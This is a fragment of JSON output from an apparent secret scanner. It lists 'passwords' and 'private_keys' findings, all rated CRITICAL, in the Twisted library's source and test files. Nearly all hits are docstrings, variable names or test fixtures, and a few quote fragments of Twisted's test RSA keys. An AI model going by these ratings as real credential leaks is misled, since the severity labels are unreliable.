            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "the Unix shadow password database.\n        @type spwd: C{module}\n        @param username: The user to look up in t"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/plugins/cred_unix.py",
            "type": "passwords",
            "line": 124,
            "severity": "CRITICAL",
            "context": "estAvatarId(self, credentials):\n        username, password = credentials.username, credentials.password\n\n        try:\n            im"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/plugins/cred_memory.py",
            "type": "passwords",
            "line": 60,
            "severity": "CRITICAL",
            "context": "nge(0, len(pieces), 2):\n                username, password = pieces[i], pieces[i + 1]\n                checker.addUser(use"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/http.py",
            "type": "passwords",
            "line": 1674,
            "severity": "CRITICAL",
            "context": "base64.b64decode(upw)\n            self.user, self.password = upw.split(b\":\", 1)\n        except (binascii.Error, ValueError)"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/xmlrpc.py",
            "type": "passwords",
            "line": 398,
            "severity": "CRITICAL",
            "context": "h the server\n        when making calls.\n    @type password: L{bytes} or L{None}\n\n    @ivar useDateTime: Accept datetim"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/xmlrpc.py",
            "type": "passwords",
            "line": 491,
            "severity": "CRITICAL",
            "context": "e taken from\n        C{url} if present.\n    @type password: L{bytes} or L{None}\n\n    @ivar allowNone: allow the use of"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/xmlrpc.py",
            "type": "passwords",
            "line": 549,
            "severity": "CRITICAL",
            "context": "pass.pop(0)\n            try:\n                self.password = userpass.pop(0)\n            except BaseException:\n               "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/xmlrpc.py",
            "type": "passwords",
            "line": 567,
            "severity": "CRITICAL",
            "context": "        if password is not None:\n            self.password = password\n        self.allowNone = allowNone\n        self.u"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/distrib.py",
            "type": "passwords",
            "line": 313,
            "severity": "CRITICAL",
            "context": "one:\n            userDatabase = pwd\n        self._pwd = userDatabase\n\n    def _users(self):\n        \"\"\"\n        Return"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/checkers.py",
            "type": "passwords",
            "line": 65,
            "severity": "CRITICAL",
            "context": " KeyError: when no such user exists\n        \"\"\"\n\n\npwd: Optional[UserDB]\ntry:\n    import pwd as _pwd\nexcept ImportError:\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/checkers.py",
            "type": "passwords",
            "line": 71,
            "severity": "CRITICAL",
            "context": "_pwd\nexcept ImportError:\n    pwd = None\nelse:\n    pwd = cast(UserDB, _pwd)\n\n\ntry:\n    import spwd as _spwd\nexcept Impo"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/checkers.py",
            "type": "passwords",
            "line": 170,
            "severity": "CRITICAL",
            "context": "rname.decode(sys.getfilesystemencoding())\n        password = credentials.password.decode(sys.getfilesystemencoding())\n\n        for func in self._getByNameFunctions:\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/checkers.py",
            "type": "passwords",
            "line": 532,
            "severity": "CRITICAL",
            "context": ") -> Iterable[keys.Key]:\n        try:\n            passwd = _lookupUser(self._userdb, username)\n        except KeyError:\n            re"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/endpoints.py",
            "type": "passwords",
            "line": 480,
            "severity": "CRITICAL",
            "context": "creator.username, command)\n        self._userauth.password = self.creator.password\n        if self.creator.keys:\n            self._u"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/endpoints.py",
            "type": "passwords",
            "line": 594,
            "severity": "CRITICAL",
            "context": "ed (otherwise\n            L{None}).\n        @type password: L{bytes} or L{None}\n\n        @param agentEndpoint: An L{IS"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/endpoints.py",
            "type": "passwords",
            "line": 737,
            "severity": "CRITICAL",
            "context": " = username\n        self.keys = keys\n        self.password = password\n        self.agentEndpoint = agentEndpoint\n      "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/telnet.py",
            "type": "passwords",
            "line": 1100,
            "severity": "CRITICAL",
            "context": "ef telnet_Password(self, line):\n        username, password = self.username, line\n        del self.username\n\n        def login"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/imap4.py",
            "type": "passwords",
            "line": 1247,
            "severity": "CRITICAL",
            "context": "param user: The username to lookup\n\n        @type passwd: L{str}\n        @param passwd: The password to login with"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/imap4.py",
            "type": "passwords",
            "line": 2946,
            "severity": "CRITICAL",
            "context": "rname: The username to log in with\n\n        @type password: L{str}\n        @param password: The password to log in w"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/protocols.py",
            "type": "passwords",
            "line": 308,
            "severity": "CRITICAL",
            "context": " of the user attempting to log in.\n\n        @type password: L{bytes}\n        @param password: The password to authenti"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/tap.py",
            "type": "passwords",
            "line": 95,
            "severity": "CRITICAL",
            "context": "to log in using\n    username: joe@example.com and password: password and collect any email that\n    has been saved in "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/tap.py",
            "type": "passwords",
            "line": 191,
            "severity": "CRITICAL",
            "context": "omain.\n        \"\"\"\n        try:\n            user, password = user_pass.split(\"=\", 1)\n        except ValueError:\n            rais"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/maildir.py",
            "type": "passwords",
            "line": 286,
            "severity": "CRITICAL",
            "context": "}\n        @param user: A username.\n\n        @type password: L{bytes}\n        @param password: A password.\n        \"\"\"\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/maildir.py",
            "type": "passwords",
            "line": 812,
            "severity": "CRITICAL",
            "context": "}\n        @param user: A username.\n\n        @type password: L{bytes}\n        @param password: A password.\n        \"\"\"\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/smtp.py",
            "type": "passwords",
            "line": 2060,
            "severity": "CRITICAL",
            "context": "  )\n        self.username = username\n        self.password = password\n        self._contextFactory = contextFactory\n   "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/smtp.py",
            "type": "passwords",
            "line": 2147,
            "severity": "CRITICAL",
            "context": "is, SMTP authentication will not occur.\n    @type password: L{bytes} or L{unicode}\n\n    @param requireTransportSecurit"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/smtp.py",
            "type": "passwords",
            "line": 2191,
            "severity": "CRITICAL",
            "context": "utf-8\")\n    if isinstance(password, str):\n        password = password.encode(\"utf-8\")\n\n    tlsHostname = smtphost\n    if not isi"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/interfaces.py",
            "type": "passwords",
            "line": 244,
            "severity": "CRITICAL",
            "context": "}\n        @param user: A username.\n\n        @type password: L{bytes}\n        @param password: A password.\n        \"\"\"\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/mail.py",
            "type": "passwords",
            "line": 385,
            "severity": "CRITICAL",
            "context": "}\n        @param user: A username.\n\n        @type password: L{bytes}\n        @param password: A password.\n        \"\"\"\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/pop3.py",
            "type": "passwords",
            "line": 66,
            "severity": "CRITICAL",
            "context": " password against the credentials.\n\n        @type password: L{bytes}\n        @param password: A plaintext password.\n\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/pop3.py",
            "type": "passwords",
            "line": 844,
            "severity": "CRITICAL",
            "context": "d,\n        send an error response.\n\n        @type password: L{bytes}\n        @param password: A password.\n\n        @ty"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/pop3.py",
            "type": "passwords",
            "line": 1302,
            "severity": "CRITICAL",
            "context": " of the user attempting to log in.\n\n        @type password: L{bytes}\n        @param password: The password to authenti"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/pop3.py",
            "type": "passwords",
            "line": 1588,
            "severity": "CRITICAL",
            "context": "The username with which to log in.\n\n        @type password: L{bytes}\n        @param password: The password with which "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/pop3.py",
            "type": "passwords",
            "line": 1662,
            "severity": "CRITICAL",
            "context": " second half of a plaintext login.\n\n        @type password: L{bytes}\n        @param password: The plaintext password w"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/pb.py",
            "type": "passwords",
            "line": 109,
            "severity": "CRITICAL",
            "context": "    if name in domain.dbm and domain.dbm[name] == password:\n            return MaildirCollection(domain.userDirectory(name))\n\n\nc"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/_pop3client.py",
            "type": "passwords",
            "line": 755,
            "severity": "CRITICAL",
            "context": "The username with which to log in.\n\n        @type password: L{bytes}\n        @param password: The password with which "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/_pop3client.py",
            "type": "passwords",
            "line": 788,
            "severity": "CRITICAL",
            "context": "The username with which to log in.\n\n        @type password: L{bytes}\n        @param password: The password with which "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/_pop3client.py",
            "type": "passwords",
            "line": 835,
            "severity": "CRITICAL",
            "context": "The username with which to log in.\n\n        @type password: L{bytes}\n        @param password: The password with which "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/_pop3client.py",
            "type": "passwords",
            "line": 854,
            "severity": "CRITICAL",
            "context": "The username with which to log in.\n\n        @type password: L{bytes}\n        @param password: The password with which "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/_pop3client.py",
            "type": "passwords",
            "line": 873,
            "severity": "CRITICAL",
            "context": "The username with which to log in.\n\n        @type password: L{bytes}\n        @param password: The password with which "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/_pop3client.py",
            "type": "passwords",
            "line": 936,
            "severity": "CRITICAL",
            "context": ", use the L{login} method instead.\n\n        @type password: L{bytes}\n        @param password: The plaintext password w"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/spread/pb.py",
            "type": "passwords",
            "line": 1262,
            "severity": "CRITICAL",
            "context": "\"\"\n    m = md5()\n    m.update(password)\n    hashedPassword = m.digest()\n    m = md5()\n    m.update(hashedPassword)\n    m."
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/spread/pb.py",
            "type": "passwords",
            "line": 1266,
            "severity": "CRITICAL",
            "context": "Password)\n    m.update(challenge)\n    doubleHashedPassword = m.digest()\n    return doubleHashedPassword\n\n\ndef challenge()"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/spread/pb.py",
            "type": "passwords",
            "line": 1487,
            "severity": "CRITICAL",
            "context": "ials against the correct password.\n\n        @type password: C{str}\n        @param password: The correct, plaintext p"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/spread/pb.py",
            "type": "passwords",
            "line": 1502,
            "severity": "CRITICAL",
            "context": "D5 digest of the\n        password.\n\n        @type password: C{str}\n        @param password: The correct MD5 digest o"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/spread/pb.py",
            "type": "passwords",
            "line": 1629,
            "severity": "CRITICAL",
            "context": "       L{IUsernameMD5Password}\n\n        @param md5Password:\n        @rtype: L{bool}\n        @return: L{True} if password matc"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/service.py",
            "type": "passwords",
            "line": 267,
            "severity": "CRITICAL",
            "context": "* NICK\n        and USER.\n        \"\"\"\n        self.password = params[-1]\n\n    def irc_NICK(self, prefix, params):\n        "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/service.py",
            "type": "passwords",
            "line": 299,
            "severity": "CRITICAL",
            "context": " nickname, \"Password?\")\n        else:\n            password = self.password\n            self.password = None\n            self"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/service.py",
            "type": "passwords",
            "line": 321,
            "severity": "CRITICAL",
            "context": "t>\n        \"\"\"\n        target = params[0]\n        password = params[-1]\n\n        if self.nickname is None:\n            # "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_cred.py",
            "type": "passwords",
            "line": 77,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n\n    def checkPassword(self, password):\n        r"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_cred.py",
            "type": "passwords",
            "line": 238,
            "severity": "CRITICAL",
            "context": "FilePasswordDB(self.dbfile)\n        UsernameHashedPassword = self.getDeprecatedModuleAttribute(\n            \"twisted.cred.credentials\", \"Username"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_cred.py",
            "type": "passwords",
            "line": 268,
            "severity": "CRITICAL",
            "context": "tes, p: bytes, s: bytes) -> bytes:\n        hashed_password = crypt(p.decode(\"ascii\"), s.decode(\"ascii\"))  # type: ignore[misc]\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_cred.py",
            "type": "passwords",
            "line": 297,
            "severity": "CRITICAL",
            "context": "estHashedCredentials(self):\n        UsernameHashedPassword = self.getDeprecatedModuleAttribute(\n            \"twisted.cred.credentials\", \"Username"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_strcred.py",
            "type": "passwords",
            "line": 26,
            "severity": "CRITICAL",
            "context": "t import TestCase\n\ncrypt = requireModule(\"crypt\")\npwd = requireModule(\"pwd\")\nspwd = requireModule(\"spwd\")\n\n\ndef getInvali"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_strcred.py",
            "type": "passwords",
            "line": 27,
            "severity": "CRITICAL",
            "context": "equireModule(\"crypt\")\npwd = requireModule(\"pwd\")\nspwd = requireModule(\"spwd\")\n\n\ndef getInvalidAuthType():\n    \"\"\"\n    Hel"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_strcred.py",
            "type": "passwords",
            "line": 192,
            "severity": "CRITICAL",
            "context": " your /etc/passwd or /etc/shadow files\n        if pwd:\n            database = UserDatabase()\n            for username, passwo"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_strcred.py",
            "type": "passwords",
            "line": 205,
            "severity": "CRITICAL",
            "context": "h(pwd, \"getpwnam\", database.getpwnam)\n        if spwd:\n            self.patch(spwd, \"getspnam\", self._spwd_getspnam)\n\n    def test_is"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_strcred.py",
            "type": "passwords",
            "line": 287,
            "severity": "CRITICAL",
            "context": "d_unix.verifyCryptedPassword}\n        \"\"\"\n        password = \"sample password ^%$\"\n\n        for salt in (None, \"ab\"):\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_strcred.py",
            "type": "passwords",
            "line": 311,
            "severity": "CRITICAL",
            "context": "cryptMethod:\n                continue\n            password = \"interesting password xyz\"\n            crypted = crypt.crypt(p"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_strcred.py",
            "type": "passwords",
            "line": 339,
            "severity": "CRITICAL",
            "context": "rd, salt):\n            raise OSError(\"\")\n\n        password = \"sample password ^%$\"\n        cryptedCorrect = crypt.cryp"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_simpleauth.py",
            "type": "passwords",
            "line": 65,
            "severity": "CRITICAL",
            "context": "{hashed} on it.\n        \"\"\"\n        UsernameHashedPassword = self.getDeprecatedModuleAttribute(\n            \"twisted.cred.credentials\", \"Username"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_simpleauth.py",
            "type": "passwords",
            "line": 77,
            "severity": "CRITICAL",
            "context": " on the object.\n        \"\"\"\n        UsernameHashedPassword = self.getDeprecatedModuleAttribute(\n            \"twisted.cred.credentials\", \"Username"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_simpleauth.py",
            "type": "passwords",
            "line": 88,
            "severity": "CRITICAL",
            "context": " on the object.\n        \"\"\"\n        UsernameHashedPassword = self.getDeprecatedModuleAttribute(\n            \"twisted.cred.credentials\", \"Username"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/test/test_simpleauth.py",
            "type": "passwords",
            "line": 98,
            "severity": "CRITICAL",
            "context": "ashedPassword}.\n        \"\"\"\n        UsernameHashedPassword = self.getDeprecatedModuleAttribute(\n            \"twisted.cred.credentials\", \"Username"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_fakepwd.py",
            "type": "passwords",
            "line": 200,
            "severity": "CRITICAL",
            "context": "r)\n        username = \"username\" + suffix\n        password = \"password\" + suffix\n        uid = self._counter\n        gid "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_fakepwd.py",
            "type": "passwords",
            "line": 218,
            "severity": "CRITICAL",
            "context": "}.\n        \"\"\"\n        username = \"alice\"\n        password = \"secr3t\"\n        uid = 123\n        gid = 456\n        gecos"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_fakepwd.py",
            "type": "passwords",
            "line": 386,
            "severity": "CRITICAL",
            "context": "r)\n        username = \"username\" + suffix\n        password = \"password\" + suffix\n        lastChange = self._counter + 1\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_fakepwd.py",
            "type": "passwords",
            "line": 408,
            "severity": "CRITICAL",
            "context": "}.\n        \"\"\"\n        username = \"alice\"\n        password = \"secr3t\"\n        lastChange = 17\n        min = 42\n        "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/test/test_xmlrpc.py",
            "type": "passwords",
            "line": 732,
            "severity": "CRITICAL",
            "context": "s when using long inputs.\n        \"\"\"\n        longPassword = self.password * 40\n        p = xmlrpc.Proxy(\n            networ"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/keydata.py",
            "type": "private_keys",
            "line": 305,
            "severity": "CRITICAL",
            "context": "ptyti8ZseZj3 comment\"\n)\n\nprivateRSA_openssh = b\"\"\"-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEA1WqseCPW1hvsJaFQxHdjUIRFAVVCFCoq4"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/keydata.py",
            "type": "private_keys",
            "line": 364,
            "severity": "CRITICAL",
            "context": "se 'encrypted'\nprivateRSA_openssh_encrypted = b\"\"\"-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: DES-EDE3-CBC,FFF"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/keydata.py",
            "type": "private_keys",
            "line": 429,
            "severity": "CRITICAL",
            "context": "keys here.\nprivateRSA_openssh_encrypted_aes = b\"\"\"-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,0673"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_recvline.py",
            "type": "passwords",
            "line": 399,
            "severity": "CRITICAL",
            "context": "init__(self, username, *a, **kw)\n            self.password = password\n\n        def getPassword(self):\n            retur"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_recvline.py",
            "type": "passwords",
            "line": 421,
            "severity": "CRITICAL",
            "context": "        self.username = username\n            self.password = password\n            self.width = width\n            self.h"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
            "type": "passwords",
            "line": 733,
            "severity": "CRITICAL",
            "context": "self.hostname,\n            self.port,\n            password=self.password,\n            knownHosts=self.knownHosts,\n         "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
            "type": "passwords",
            "line": 834,
            "severity": "CRITICAL",
            "context": "self.hostname,\n            self.port,\n            password=self.password,\n            knownHosts=self.knownHosts,\n         "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
            "type": "passwords",
            "line": 1138,
            "severity": "CRITICAL",
            "context": "self.port,\n            keys=[badKey],\n            password=self.password,\n            knownHosts=self.knownHosts,\n         "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
            "type": "passwords",
            "line": 1334,
            "severity": "CRITICAL",
            "context": "self.hostname,\n            self.port,\n            password=self.password,\n            knownHosts=knownHosts,\n            ui"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_unix.py",
            "type": "passwords",
            "line": 128,
            "severity": "CRITICAL",
            "context": "ration will be extraneous\n        creds: IUsernamePassword = UsernamePassword(b\"user\", b\"password\")\n        result = p.login(creds"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
            "type": "passwords",
            "line": 72,
            "severity": "CRITICAL",
            "context": "rypted password passed to it.\n        \"\"\"\n        password = \"secret string\"\n        salt = \"salty\"\n        crypted = "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
            "type": "passwords",
            "line": 87,
            "severity": "CRITICAL",
            "context": "e provided MD5 password hash.\n        \"\"\"\n        password = \"password\"\n        salt = \"$1$salt\"\n        crypted = crypt."
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "rypted password passed to it.\n        \"\"\"\n        password = \"string secret\"\n        wrong = \"secret string\"\n        c"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
            "type": "passwords",
            "line": 475,
            "severity": "CRITICAL",
            "context": "\"$1$\" + salt)\n            return crypted\n\n        pwd = UserDatabase()\n        pwd.addUser(\n            \"alice\", crypted"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
            "type": "passwords",
            "line": 481,
            "severity": "CRITICAL",
            "context": "b\", \"x\", 1, 2, \"bar\", \"/bar\", \"/bin/sh\")\n        spwd = ShadowDatabase()\n        spwd.addUser(\"alice\", \"wrong\", 1, 2, 3, 4"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
            "type": "passwords",
            "line": 523,
            "severity": "CRITICAL",
            "context": "NIX\n        user information.\n        \"\"\"\n        password = crypt.crypt(\"secret\", \"secret\")\n        userdb = UserDatabase()"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
            "type": "passwords",
            "line": 606,
            "severity": "CRITICAL",
            "context": "word.  Instead it is skipped.\n        \"\"\"\n        pwd = UserDatabase()\n        pwd.addUser(\"alice\", \"\", 1, 2, \"\", \"foo\","
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_userauth.py",
            "type": "passwords",
            "line": 194,
            "severity": "CRITICAL",
            "context": "(self, creds):\n        if creds.username == creds.password:\n            return defer.succeed(creds.username)\n        return defe"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_userauth.py",
            "type": "passwords",
            "line": 773,
            "severity": "CRITICAL",
            "context": "urn False.\n        \"\"\"\n        self.authClient.getPassword = lambda: None\n        self.assertFalse(self.authClient.try"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_cftp.py",
            "type": "passwords",
            "line": 405,
            "severity": "CRITICAL",
            "context": "ectory = \"/\"\n        self.database = self.client._pwd = UserDatabase()\n        # Use a fixed width for all tests so that"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/ssh/userauth.py",
            "type": "passwords",
            "line": 310,
            "severity": "CRITICAL",
            "context": "nd verify it with our portal.\n        \"\"\"\n        password = getNS(packet[1:])[0]\n        c = credentials.UsernamePassword(self.use"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/ssh/userauth.py",
            "type": "passwords",
            "line": 658,
            "severity": "CRITICAL",
            "context": "word: the password the user entered\n        @type password: L{bytes}\n        \"\"\"\n        self.askForAuth(b\"password\", "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/client/default.py",
            "type": "passwords",
            "line": 208,
            "severity": "CRITICAL",
            "context": "ompt)\n        else:\n            prompt = \"{}@{}'s password: \".format(\n                nativeString(self.user),\n        "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/scripts/tkconch.py",
            "type": "passwords",
            "line": 513,
            "severity": "CRITICAL",
            "context": "     if not prompt:\n            prompt = \"{}@{}'s password: \".format(self.user, options[\"host\"])\n        return deferredAskFrame("
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/scripts/tkconch.py",
            "type": "passwords",
            "line": 546,
            "severity": "CRITICAL",
            "context": "  try:\n            return keys.Key.fromFile(file, password=ans).keyObject\n        except keys.BadKeyError:\n            if c"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_imap.py",
            "type": "passwords",
            "line": 3521,
            "severity": "CRITICAL",
            "context": "f, response):\n                self.username, self.password = response.split(None, 1)\n\n            def moreChallenges(self):\n       "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_imap.py",
            "type": "passwords",
            "line": 3527,
            "severity": "CRITICAL",
            "context": "eckPassword(self, password):\n                self.password = self.password\n\n        special = SPECIALAuth()\n        verifyOb"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/pop3testserver.py",
            "type": "passwords",
            "line": 140,
            "severity": "CRITICAL",
            "context": "     resp = None\n            try:\n                pwd = line.split(\" \")[1]\n\n                if self.tmpUser is None or"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_smtp.py",
            "type": "passwords",
            "line": 1790,
            "severity": "CRITICAL",
            "context": "actor,\n            username=username,\n            password=password,\n            requireTransportSecurity=True,\n      "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_pop3.py",
            "type": "passwords",
            "line": 402,
            "severity": "CRITICAL",
            "context": "ox}.\n\n        @param user: ignored\n        @param password: ignored\n\n        @return: A three-tuple like the one retu"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_pop3.py",
            "type": "passwords",
            "line": 627,
            "severity": "CRITICAL",
            "context": " real_user: The user to test.\n\n        @type real_password: L{bytes}\n        @param real_password: The password of the"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_pop3.py",
            "type": "passwords",
            "line": 634,
            "severity": "CRITICAL",
            "context": "one, real_user will be used.\n\n        @type tried_password: L{bytes} or L{None}\n        @param tried_password: The pas"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_pop3.py",
            "type": "passwords",
            "line": 646,
            "severity": "CRITICAL",
            "context": "      tried_user = real_user\n        if not tried_password:\n            tried_password = real_password\n        response = [\n            "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_pop3.py",
            "type": "passwords",
            "line": 653,
            "severity": "CRITICAL",
            "context": "eal_user == tried_user and real_password == tried_password:\n            response = [\n                b\"+OK <moshez>\",\n            "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_pop3.py",
            "type": "passwords",
            "line": 676,
            "severity": "CRITICAL",
            "context": "oduced by calling PASS before USER.\n        @type password: L{bytes}\n        @param password: A password to test.\n    "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/irc.py",
            "type": "passwords",
            "line": 1136,
            "severity": "CRITICAL",
            "context": "nickname: Nickname the client will use.\n    @ivar password: Password used to log on to the server.  May be L{None}.\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_irc.py",
            "type": "passwords",
            "line": 2235,
            "severity": "CRITICAL",
            "context": "tocol.realname = \"testname\"\n        self.protocol.password = \"testpass\"\n        self.protocol.register(username, hostname"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_irc.py",
            "type": "passwords",
            "line": 2256,
            "severity": "CRITICAL",
            "context": "tocol.realname = \"testname\"\n        self.protocol.password = \"testpass\"\n        self.protocol.register(username, hostname"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_ircsupport.py",
            "type": "passwords",
            "line": 74,
            "severity": "CRITICAL",
            "context": "{USER} commands.\n        \"\"\"\n        self.account.password = \"secret\"\n        self.proto.makeConnection(self.transport)"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_service.py",
            "type": "passwords",
            "line": 197,
            "severity": "CRITICAL",
            "context": " {expected!r}\")\n\n    def _login(self, user, nick, password=None):\n        if password is None:\n            password"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabberclient.py",
            "type": "passwords",
            "line": 104,
            "severity": "CRITICAL",
            "context": "example.com/resource\")\n        self.authenticator.password = \"secret\"\n\n    def testPlainText(self):\n        \"\"\"\n       "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbersasl.py",
            "type": "passwords",
            "line": 243,
            "severity": "CRITICAL",
            "context": "ID(\"test@example.com\")\n        self.authenticator.password = \"secret\"\n        name = \"PLAIN\"\n\n        self.assertEqual("
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbersasl.py",
            "type": "passwords",
            "line": 253,
            "severity": "CRITICAL",
            "context": "ID(\"test@example.com\")\n        self.authenticator.password = \"secret\"\n        name = \"DIGEST-MD5\"\n\n        self.assertE"
          },
          {
